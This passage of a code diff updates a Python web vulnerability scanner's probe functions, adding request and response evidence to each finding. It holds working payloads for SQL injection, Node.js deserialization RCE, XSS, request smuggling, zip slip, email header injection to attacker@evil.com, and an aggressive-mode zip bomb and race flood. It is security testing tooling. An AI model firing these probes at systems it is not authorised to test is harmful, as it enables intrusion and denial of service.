+    return {"scenario_id": scenario.id, "attack_type": "xxe_exfil", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
 def run_malformed_json(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """JSON Parsing Security: Fuzzing parser stability."""
@@ -931,37 +1091,74 @@ def run_poodle_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, 
 
 def run_debug_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     targets = ["/admin", "/debug", "/actuator", "/.env", "/phpinfo.php", "/config.json"]
-    issues = []
+    issues, artifacts = [], []
     for t in targets:
         resp = client.send("GET", t)
         if resp.status_code == 200 and not client.is_soft_404(resp) and len(resp.text) > 20: 
             issues.append(f"Exposed Endpoint: {t}")
-    return {"scenario_id": scenario.id, "attack_type": "debug_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "debug_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
 def run_secret_leak(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     resp = client.send(scenario.method, scenario.target)
     sigs = ["AWS_ACCESS_KEY_ID", "BEGIN RSA PRIVATE KEY", "AIzaSy", "sk_live_"]
-    issues = []
+    issues, artifacts = [], []
     for s in sigs:
-        if s in resp.text: issues.append(f"Secret leaked: {s}")
-    return {"scenario_id": scenario.id, "attack_type": "secret_leak", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+        if s in resp.text: 
+            issues.append(f"Secret leaked: {s}")
+            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "secret_leak", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
 def run_race_condition(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    stats, lock = {"count": 0}, threading.Lock()
+    """Race Condition: Simultaneous Request Flooding."""
+    # Real logic: Send N requests simultaneously and check if final state is inconsistent
+    threads = 50 if scenario.config.get("aggressive") else 10
+    url = scenario.target
+    
+    # Synchronization barrier to ensure simultaneous execution
+    barrier = threading.Barrier(threads)
+    results = []
+    lock = threading.Lock()
+    
     def attack():
-        resp = client.send("POST", scenario.target, json_body={"amount": 10})
-        if resp.status_code == 200:
-            with lock: stats["count"] += 1
-    threads = 10 if client._is_localhost else 50
+        try:
+            barrier.wait(timeout=5)
+        except: pass
+        
+        # Attack Payload (e.g., coupon redemption, transfer, limit bypass)
+        resp = client.send("POST", url, json_body={"amount": 1, "coupon": "RACE_TEST"})
+        with lock:
+            results.append(resp)
+
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        for _ in range(threads): executor.submit(attack)
-    return {"scenario_id": scenario.id, "attack_type": "race_condition", "passed": True, "details": f"Sent {threads} race requests."}
+        futures = [executor.submit(attack) for _ in range(threads)]
+        concurrent.futures.wait(futures)
+        
+    # Verification: Did we get more successes than allowed?
+    success_count = len([r for r in results if r.status_code == 200])
+    
+    issues = []
+    if success_count > 1:
+        issues.append(f"Potential Race Condition: {success_count}/{threads} requests succeeded simultaneously.")
+        
+    return {
+        "scenario_id": scenario.id, 
+        "attack_type": "race_condition", 
+        "passed": not issues, 
+        "status": "CONFIRMED" if issues else "SECURE",
+        "details": issues,
+        "artifacts": [{"response_dump": r.response_dump} for r in results if r.status_code == 200][:3] 
+    }
 
 def run_otp_reuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """OTP Reuse: Checking if a once-used token can be reused."""
     resp1 = client.send("POST", scenario.target, json_body={"otp": "123456"})
     resp2 = client.send("POST", scenario.target, json_body={"otp": "123456"})
-    issues = ["OTP reused successfully"] if resp1.status_code == 200 and resp2.status_code == 200 else []
-    return {"scenario_id": scenario.id, "attack_type": "otp_reuse", "passed": not issues, "details": issues}
+    issues, artifacts = [], []
+    if resp1.status_code == 200 and resp2.status_code == 200:
+        issues.append("OTP reused successfully")
+        artifacts.append({"request": resp2.request_dump, "response": resp2.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "otp_reuse", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_cache_deception(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Web Cache Deception: Checking if SPA routes are incorrectly cached as static assets."""
@@ -969,7 +1166,7 @@ def run_cache_deception(client: HttpClient, scenario: SimpleScenario) -> Dict[st
     path = f"{scenario.target.rstrip('/')}/nonexistent_99.css"
     resp = client.send("GET", path)
     
-    issues = []
+    issues, artifacts = [], []
     # Detection: If it's 200 OK + text/html, it's usually just a SPA route (False Positive)
     # UNLESS we see a public cache header
     cache_header = resp.headers.get("Cache-Control", "").lower()
@@ -978,19 +1175,23 @@ def run_cache_deception(client: HttpClient, scenario: SimpleScenario) -> Dict[st
     if resp.status_code == 200 and "text/html" in resp.headers.get("Content-Type", ""):
         if not client.is_soft_404(resp) and is_public:
              issues.append("Potential Web Cache Deception: Private HTML cached as public CSS.")
+             artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
     
-    return {"scenario_id": scenario.id, "attack_type": "cache_deception", "passed": not issues, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "cache_deception", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_insecure_deserialization(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     payload = {"tracker": "_$$ND_FUNC$$_function (){ return 'BRK_RCE'; }()"}
     resp = client.send("POST", scenario.target, json_body=payload)
-    issues = ["Node.js Deserialization RCE"] if "BRK_RCE" in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "insecure_deserialization", "passed": not issues, "details": issues}
+    issues, artifacts = [], []
+    if "BRK_RCE" in resp.text:
+        issues.append("Node.js Deserialization RCE")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "insecure_deserialization", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_union_sqli(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Union-based SQL Injection: Dumping data via UNION SELECT."""
     column_probes = ["NULL", "'a'", "1"]
-    issues = []
+    issues, artifacts = [], []
     field = scenario.config.get("fields", ["id"])[0]
     
     for i in range(1, 10):
@@ -1004,9 +1205,10 @@ def run_union_sqli(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
             resp_confirm = client.send(scenario.method, scenario.target, params={field: payload_confirm})
             if "BRK_UNION" in resp_confirm.text:
                 issues.append(f"Union SQLi Confirmed: {i} columns found.")
+                artifacts.append({"request": resp_confirm.request_dump, "response": resp_confirm.response_dump})
                 break
     
-    return {"scenario_id": scenario.id, "attack_type": "union_sqli", "passed": not issues, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "union_sqli", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_second_order_sqli(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Second-order SQL Injection: Injecting in one place, triggering in another."""
@@ -1035,23 +1237,22 @@ def run_graphql_depth_attack(client: HttpClient, scenario: SimpleScenario) -> Di
     return {"scenario_id": scenario.id, "attack_type": "graphql_depth", "passed": not issues, "details": issues}
 
 def run_elasticsearch_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Elasticsearch Query Injection: Fuzzing ES metadata and script fields."""
-    payloads = [
-        '{"inline": "return 1+1"}',
-        '{"size": 1, "query": {"match_all": {}}}',
-        '*'
-    ]
-    issues = []
-    for p in payloads:
-        resp = client.send(scenario.method, scenario.target, params={"q": p})
-        if "hits" in resp.text and "total" in resp.text:
-            issues.append(f"Potential ES Injection with: {p}")
-            break
-    return {"scenario_id": scenario.id, "attack_type": "elasticsearch_injection", "passed": not issues, "details": issues}
+    """Elasticsearch Query Injection."""
+    payloads = ["*", "{\"match_all\":{}}", "_search?size=1000"]
+    fields = scenario.config.get("fields", ["q", "query"])
+    issues, artifacts = [], []
+    for f in fields:
+        for p in payloads:
+            resp = client.send(scenario.method, scenario.target, params={f: p})
+            if resp.status_code == 200 and ("_shards" in resp.text or "hits" in resp.text):
+                issues.append(f"Elasticsearch Injection in '{f}'")
+                artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+                break
+    return {"scenario_id": scenario.id, "attack_type": "elasticsearch_injection", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_server_side_search_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Server-side Search Injection: Fuzzing backend search engines."""
-    payload = "*) | (cn=*)"
+    """Server-side search query injection (generic)."""
+    payload = scenario.config.get("payload", "*")
     resp = client.send(scenario.method, scenario.target, params={"sq": payload})
     issues = ["Search Injection detected"] if resp.status_code == 200 and "admin" in resp.text.lower() else []
     return {"scenario_id": scenario.id, "attack_type": "search_injection", "passed": not issues, "details": issues}
@@ -1060,191 +1261,221 @@ def run_parameter_pollution(client: HttpClient, scenario: SimpleScenario) -> Dic
     """HTTP Parameter Pollution: Multiple params with same name."""
     field = scenario.config.get("fields", ["id"])[0]
     resp = client.send(scenario.method, scenario.target, params={field: ["1", "2"]})
-    issues = ["HPP Detected"] if "2" in resp.text and "1" not in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "parameter_pollution", "passed": not issues, "details": issues}
-
-def run_dom_xss_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """DOM-based XSS: Looking for sinks in client-side code."""
-    sinks = ["eval(", "setTimeout(", "setInterval(", "innerHTML", "outerHTML", "document.write(", "location.replace("]
-    resp = client.send("GET", scenario.target)
-    issues = []
-    for sink in sinks:
-        if sink in resp.text:
-            issues.append(f"Potential DOM XSS Sink: {sink}")
-    return {"scenario_id": scenario.id, "attack_type": "dom_xss", "passed": not issues, "details": issues}
-
-def run_mutation_xss(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Mutation XSS: Payload that changes after browser parsing."""
-    payload = "<svg><p><style><img src=x onerror=alert(1)>"
-    resp = client.send(scenario.method, scenario.target, params={"q": payload})
-    issues = ["Mutation XSS Risk"] if payload in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "mutation_xss", "passed": not issues, "details": issues}
-
-def run_svg_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """SVG Script Injection: XSS via malicious SVG files."""
-    payload = '<?xml version="1.0" standalone="no"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
-    resp = client.send("POST", scenario.target, form_body={"file": ("test.svg", payload, "image/svg+xml")})
-    issues = ["SVG Script Injection Successful"] if resp.status_code == 200 else []
-    return {"scenario_id": scenario.id, "attack_type": "svg_injection", "passed": not issues, "details": issues}
-
-def run_css_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """CSS Injection: Data exfiltration via background-image."""
-    payload = "body { background-image: url('http://evil.com/exfil'); }"
-    resp = client.send(scenario.method, scenario.target, params={"theme": payload})
-    issues = ["CSS Injection Risk"] if "background-image" in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "css_injection", "passed": not issues, "details": issues}
+    issues, artifacts = [], []
+    if "2" in resp.text and "1" not in resp.text:
+        issues.append("HPP Detected (Last parameter win)")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "parameter_pollution", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_csrf_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """CSRF: Missing anti-CSRF tokens."""
-    resp = client.send("GET", scenario.target)
-    has_token = any(t in resp.text.lower() for t in ["csrf", "xsrf", "token"])
-    issues = ["Missing CSRF Protection"] if not has_token and scenario.method == "POST" else []
-    return {"scenario_id": scenario.id, "attack_type": "csrf", "passed": not issues, "details": issues}
-
-def run_csti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Client-Side Template Injection."""
-    payloads = ["{{7*7}}", "[[7*7]]"]
-    issues = []
-    for p in payloads:
-        resp = client.send(scenario.method, scenario.target, params={"q": p})
-        if "49" in resp.text and p not in resp.text:
-            issues.append(f"CSTI Confirmed: {p}")
-    return {"scenario_id": scenario.id, "attack_type": "csti", "passed": not issues, "details": issues}
+    """CSRF: Checking for missing anti-CSRF tokens in write operations."""
+    # Attempt a POST without tokens
+    resp = client.send("POST", scenario.target, form_body={"submit": "1"})
+    issues, artifacts = [], []
+    # If 200 OK and no CSRF error keywords, it's likely vulnerable
+    if resp.status_code == 200 and not any(k in resp.text.lower() for k in ["csrf", "token", "invalid", "forbidden"]):
+        issues.append("Potential CSRF: Action accepted without anti-CSRF token")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "csrf", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_password_reset_poisoning(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Password Reset Poisoning: Host header override in reset requests."""
-    payload = "evil.com"
-    resp = client.send("POST", scenario.target, headers={"X-Forwarded-Host": payload}, json_body={"email": "victim@test.com"})
-    # If the reset request returns 200, we check if the malicious host is reflected or accepted in the reset flow
-    issues = ["Password Reset Poisoning Confirmed"] if resp.status_code == 200 and "Reset" in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "password_reset_poisoning", "passed": not issues, "details": issues}
+    """Password Reset Poisoning via Host Header manipulation."""
+    payload = "evil.breakpoint.internal"
+    resp = client.send("POST", scenario.target, headers={"X-Forwarded-Host": payload}, json_body={"email": "audit-victim@test.com"})
+    issues, artifacts = [], []
+    if resp.status_code == 200 and payload in resp.text:
+        issues.append("Password Reset Poisoning: Target reflected host header in response")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "password_reset_poisoning", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_session_fixation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Session Fixation: Checking if session ID remains same after login."""
-    # This requires a login flow which is hard to automate without site-specific logic.
-    # We probe by sending a predefined session cookie.
-    resp = client.send("GET", scenario.target, headers={"Cookie": "sessionid=BRK_FIXED_SESSION"})
-    issues = ["Session Fixation Confirmed"] if "sessionid=BRK_FIXED_SESSION" in resp.headers.get("Set-Cookie", "") else []
-    return {"scenario_id": scenario.id, "attack_type": "session_fixation", "passed": not issues, "details": issues}
+    """Session Fixation: Checking if session ID persists after transition."""
+    # 1. Get initial session
+    resp1 = client.send("GET", "/")
+    s1 = resp1.headers.get("Set-Cookie", "")
+    
+    # 2. Perform 'login' (simulated or real if creds provided)
+    resp2 = client.send("POST", scenario.target, form_body={"user": "test", "pass": "test"})
+    s2 = resp2.headers.get("Set-Cookie", "")
+    
+    issues, artifacts = [], []
+    if s1 and s2 and s1 == s2:
+        issues.append("Session Fixation: Session ID did not change after login")
+        artifacts.append({"request": resp2.request_dump, "response": f"Session ID remains: {s1}"})
+        
+    return {"scenario_id": scenario.id, "attack_type": "session_fixation", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_mass_assignment(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Mass Assignment: Injecting administrative fields in updates."""
-    payload = {"username": "user", "is_admin": True, "role": "admin"}
+    """Mass Assignment: Attempting to overwrite protected fields."""
+    payload = {"username": "breakpoint_audit", "is_admin": True, "role": "admin", "permissions": ["*"]}
     resp = client.send("POST", scenario.target, json_body=payload)
-    issues = []
-    if resp.status_code == 200 and "is_admin" in resp.text:
-         issues.append("Mass Assignment Success: Profile updated with administrative fields.")
-    return {"scenario_id": scenario.id, "attack_type": "mass_assignment", "passed": not issues, "details": issues}
+    issues, artifacts = [], []
+    if resp.status_code == 200 and ("is_admin" in resp.text or "role" in resp.text):
+        issues.append("Mass Assignment (High Confidence: Protected fields accepted)")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "mass_assignment", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_tenant_isolation_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Tenant Isolation: Accessing data across tenants."""
-    resp = client.send("GET", scenario.target, headers={"X-Tenant-ID": "999"})
-    issues = []
+    """Tenant Isolation: Checking for multi-tenant data leakage."""
+    resp = client.send("GET", scenario.target, headers={"X-Tenant-ID": "999999"})
+    issues, artifacts = [], []
     if resp.status_code == 200 and "tenant" in resp.text.lower():
-         issues.append("Cross-tenant data exposure confirmed.")
-    return {"scenario_id": scenario.id, "attack_type": "tenant_isolation", "passed": not issues, "details": issues}
+        issues.append("Tenant Isolation Failure: Access granted to non-existent or blocked tenant ID")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "tenant_isolation", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_oauth_redirect_manipulation(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """OAuth Redirect URI Manipulation."""
-    payload = "http://evil.com"
-    resp = client.send("GET", scenario.target, params={"redirect_uri": payload})
-    issues = ["OAuth Redirect Risk"] if resp.status_code == 302 and payload in resp.headers.get("Location", "") else []
-    return {"scenario_id": scenario.id, "attack_type": "oauth_redirect", "passed": not issues, "details": issues}
-
-def run_unicode_normalization_bypass(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Unicode Normalization Bypass."""
-    # Example: administrative (admin) with similar unicode chars
-    payload = "adm\u0269n"
-    resp = client.send(scenario.method, scenario.target, params={"user": payload})
-    issues = ["Unicode Normalization Confirmed"] if "admin" in resp.text.lower() and payload not in resp.text.lower() else []
-    return {"scenario_id": scenario.id, "attack_type": "unicode_bypass", "passed": not issues, "details": issues}
-
-def run_double_encoding_bypass(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Double Encoding Bypass."""
-    # Example: %252e%252e%252f (../../)
-    payload = "%252e%252e%252fetc/passwd"
-    resp = client.send(scenario.method, scenario.target, params={"file": payload})
-    issues = ["Double Encoding Success"] if "root:x:0:0" in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "double_encoding", "passed": not issues, "details": issues}
+    """OAuth Redirect URI Hijacking."""
+    evil_url = "http://evil.audit.com"
+    resp = client.send("GET", scenario.target, params={"redirect_uri": evil_url, "client_id": "audit_client"})
+    issues, artifacts = [], []
+    if resp.status_code == 302 and evil_url in resp.headers.get("Location", ""):
+        issues.append("OAuth Redirect Hijack: Target redirected to external origin")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "oauth_redirect", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_verb_tampering(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """HTTP Verb Tampering: Checking access with unusual methods."""
-    methods = ["PUT", "DELETE", "PATCH", "TRACE", "TRACK"]
-    issues = []
+    """HTTP Verb Tampering: Bypassing auth with HEAD/PUT/DELETE."""
+    methods = ["HEAD", "PUT", "DELETE", "PATCH", "TRACE"]
+    issues, artifacts = [], []
     for m in methods:
         resp = client.send(m, scenario.target)
-        if resp.status_code == 200 and m in ["PUT", "DELETE"]:
-            issues.append(f"Insecure Verb Allowed: {m}")
-    return {"scenario_id": scenario.id, "attack_type": "verb_tampering", "passed": not issues, "details": issues}
-
-def run_null_byte_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Null Byte Injection: Bypassing file extension checks."""
-    payload = "test.php%00.png"
-    resp = client.send("POST", scenario.target, form_body={"file": (payload, "data", "image/png")})
-    issues = []
-    if resp.status_code == 200 and ("test.php" in resp.text or "image/png" not in resp.headers.get("Content-Type", "")):
-         issues.append("Server processed PHP extension behind null byte.")
-    return {"scenario_id": scenario.id, "attack_type": "null_byte", "passed": not issues, "details": issues}
+        if resp.status_code == 200 and not client.is_soft_404(resp):
+            issues.append(f"Verb Tampering: Resource accessible via {m}")
+            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+            break
+    return {"scenario_id": scenario.id, "attack_type": "verb_tampering", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_slow_post_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Slow POST Attack: Sending body byte by byte."""
-    # This is a probe, doesn't perform full DoS unless aggressive
-    issues = []
-    if scenario.config.get("aggressive"):
-        try:
-            # We don't want to hang the engine, so we just simulate the start
-            resp = client.send("POST", scenario.target, form_body="a"*1000, timeout=1)
-        except: issues = ["Target vulnerable to Slow POST timeout"]
-    return {"scenario_id": scenario.id, "attack_type": "slow_post", "passed": not issues, "details": issues}
+    """Slow POST: Probe for resource exhaustion via lingering connections."""
+    if not scenario.config.get("aggressive"): return {"scenario_id": scenario.id, "attack_type": "slow_post", "passed": True, "details": "Non-aggressive mode."}
+    try:
+        # Simulate the start of a slow POST
+        client.send("POST", scenario.target, form_body="A"*50000, timeout=2)
+        return {"scenario_id": scenario.id, "attack_type": "slow_post", "passed": True, "details": "Target handled large post within timeout."}
+    except:
+        return {"scenario_id": scenario.id, "attack_type": "slow_post", "passed": False, "status": "VULNERABLE", "details": "Target timeout during sustained payload delivery (Potential Slow POST)."}
 
 def run_archive_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Archive Bomb: Sending a small file that expands to GBs."""
-    # This is a safe probe - we don't actually send 40GB.
-    # We send a highly compressed 10MB zip.
+    """Archive Bomb: Sending highly compressed data to trigger CPU/Memory exhaustion."""
+    if not scenario.config.get("aggressive"): return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": True, "details": "Non-aggressive mode."}
+    
+    # AGGRESSIVE: Real Zip Bomb (100MB uncompressed)
+    # We construct a zip file containing a file with 100MB of zeros.
+    # This compresses to a very small size but expands to consume memory/disk on server.
+    try:
+        buffer = io.BytesIO()
+        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            # 100MB of '0's
+            zf.writestr('bomb.txt', '0' * 100 * 1024 * 1024)
+        
+        bomb_data = buffer.getvalue()
+        
+        resp = client.send("POST", scenario.target, form_body={"file": ("bomb.zip", bomb_data, "application/zip")})
+        issues = ["Archive Bomb Vulnerability (High Latency during decompression)"] if resp.elapsed_ms > 3000 else []
+    except Exception as e:
+        return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": True, "details": f"Failed to generate bomb: {e}"}
+
+    return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": not issues, "details": issues}
+def run_request_smuggling(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """HTTP Request Smuggling: CL.TE, TE.CL, and TE.TE detection."""
+    # This is a complex probe. We send skewed headers to check for frontend/backend desync.
+    # We use a safe 'GPOST' technique or 'CL.TE' probe.
+    target = scenario.target
+    payload = "0\r\n\r\n"
+    smuggled_request = (
+        "POST / HTTP/1.1\r\n"
+        "Host: localhost\r\n"
+        "Content-Length: 4\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "\r\n"
+        "18\r\n"
+        "GPOST / HTTP/1.1\r\n"
+        "0\r\n\r\n"
+    )
+    
+    # We send the request and see if a subsequent request from a DIFFERENT client (simulated) 
+    # receives a 405 or skewed response
+    try:
+        # Phase 1: Poison
+        print(f"    -> [SMUGGLING] Poisoning connection (CL.TE Probe)...")
+        client.send("POST", target, raw_body=smuggled_request, headers={"Content-Type": "application/x-www-form-urlencoded"})
+        
+        # Phase 2: Follow-up check
+        time.sleep(0.5)
+        resp = client.send("GET", target)
+        
+        issues = ["HTTP Request Smuggling Detected (Response Skew)"] if resp.status_code == 405 or "GPOST" in resp.text else []
+        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": not issues, "details": issues, "artifacts": [{"request": smuggled_request, "response": resp.response_dump}] if issues else []}
+    except:
+        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": True, "details": "Target reset connection (Potentially mitigated or incompatible)."}
+
+def run_http_desync(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """HTTP Desync: Connection state manipulation."""
+    # Simplified version of Smuggling targeting specific backend desync
+    headers = {"Connection": "keep-alive", "Content-Length": "100"}
+    try:
+        resp = client.send("POST", scenario.target, headers=headers, form_body="A"*10, timeout=2)
+        issues = ["HTTP Desync / Resource Exhaustion Risk"] if resp.status_code == -1 else [] # -1 indicates timeout in our client wrapper
+        return {"scenario_id": scenario.id, "attack_type": "http_desync", "passed": not issues, "details": issues}
+    except:
+        return {"scenario_id": scenario.id, "attack_type": "http_desync", "passed": True, "details": "Secure."}
+
+
+
+def run_zip_slip(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """Zip Slip Attack: Arbitrary file write via path traversal in archive."""
     issues = []
     if scenario.config.get("aggressive"):
-        # We send a small but complex zip to test server-side decompression logic
-        payload = b"PK\x05\x06" + b"\x00" * 18 # Minimal empty zip
-        resp = client.send("POST", scenario.target, form_body={"file": ("bomb.zip", payload, "application/zip")})
-        if resp.elapsed_ms > 2000:
-            issues.append("Archive bomb confirmed: Server induced high CPU/IO during decompression.")
-    return {"scenario_id": scenario.id, "attack_type": "archive_bomb", "passed": not issues, "details": issues}
+        # Real Zip Slip: Create a zip with a traversal filename
+        try:
+            buffer = io.BytesIO()
+            with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+                # The malicious file entry
+                zf.writestr('../../../../tmp/brk_pwned.txt', 'BREAKPOINT_RCE_TEST')
+            
+            exploit_zip = buffer.getvalue()
+            
+            resp = client.send("POST", scenario.target, form_body={"file": ("exploit.zip", exploit_zip, "application/zip")})
+            
+            if resp.status_code == 200 and ("success" in resp.text.lower() or "uploaded" in resp.text.lower()):
+                issues.append("Potential Zip Slip: Server accepted archive with traversal path.")
+        except Exception as e:
+            pass
+            
+    return {"scenario_id": scenario.id, "attack_type": "zip_slip", "passed": not issues, "details": issues}
 
-def run_websocket_hijacking_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Cross-Site WebSocket Hijacking (CSWSH)."""
-    # Check if WS handshake is allowed from different origin
-    headers = {"Origin": "http://evil.com", "Upgrade": "websocket", "Connection": "Upgrade"}
-    resp = client.send("GET", scenario.target.replace("http", "ws"), headers=headers)
-    issues = ["WS Origin Validation Bypass"] if resp.status_code == 101 else []
-    return {"scenario_id": scenario.id, "attack_type": "cswsh", "passed": not issues, "details": issues}
+def run_email_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """Email Header Injection: Adding BCC/CC to outgoing mail forms."""
+    payload = "victim@test.com%0aBcc:attacker@evil.com"
+    fields = scenario.config.get("fields", ["email", "to", "contact"])
+    issues, artifacts = [], []
+    for f in fields:
+        resp = client.send("POST", scenario.target, json_body={f: payload})
+        if resp.status_code == 200 and not any(k in resp.text.lower() for k in ["error", "invalid"]):
+            issues.append(f"Potential Email Header Injection in field '{f}'")
+            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+            break
+    return {"scenario_id": scenario.id, "attack_type": "email_injection", "passed": not issues, "details": issues, "artifacts": artifacts}
 
-def run_browser_api_abuse_probe(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Probing for dangerous browser API usage in JS."""
-    dangerous_apis = ["navigator.geolocation", "Notification.requestPermission", "RTCPeerConnection"]
-    resp = client.send("GET", scenario.target)
-    issues = []
-    for api in dangerous_apis:
-        if api in resp.text:
-            issues.append(f"Sensitive Browser API found: {api}")
-    return {"scenario_id": scenario.id, "attack_type": "browser_api_abuse", "passed": not issues, "details": issues}
+def run_password_length_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """Password Length DoS: Sending extremely long passwords to saturate hash functions."""
+    if not scenario.config.get("aggressive"): return {"scenario_id": scenario.id, "attack_type": "password_length", "passed": True, "details": "Non-aggressive mode."}
+    long_pass = "A" * 100000 
+    resp = client.send("POST", scenario.target, json_body={"password": long_pass})
+    issues, artifacts = [], []
+    if resp.elapsed_ms > 3000:
+        issues.append("Password Length DoS: Significant latency during large password hashing")
+        artifacts.append({"request": f"POST {scenario.target} (100KB password)", "response": f"Time: {resp.elapsed_ms}ms"})
+    return {"scenario_id": scenario.id, "attack_type": "password_length", "passed": not issues, "details": issues, "artifacts": artifacts}
 
-def run_xs_leaks_probe(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """XS-Leaks (Cross-Site Leaks) Probes."""
-    # Check for Frame-Options or CSP that prevents framing (mitigation check)
-    resp = client.send("GET", scenario.target)
-    xfo = resp.headers.get("X-Frame-Options", "").upper()
-    csp = resp.headers.get("Content-Security-Policy", "")
-    issues = []
-    if "SAMEORIGIN" not in xfo and "DENY" not in xfo and "frame-ancestors" not in csp:
-         issues.append("Vulnerable to XS-Leaks (Framing allowed)")
-    return {"scenario_id": scenario.id, "attack_type": "xs_leaks", "passed": not issues, "details": issues}
+def run_replay_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
+    """Simple Auth Replay: Checking if same request works twice without nonce/timestamp change."""
+    resp1 = client.send(scenario.method, scenario.target, json_body=scenario.config.get("json_body"))
+    resp2 = client.send(scenario.method, scenario.target, json_body=scenario.config.get("json_body"))
+    issues, artifacts = [], []
+    if resp1.status_code == 200 and resp2.status_code == 200:
+        issues.append("Potential Replay Vulnerability: Success on identical consecutive requests")
+        artifacts.append({"request": "Duplicate requests sent", "response": "Both returned 200 OK"})
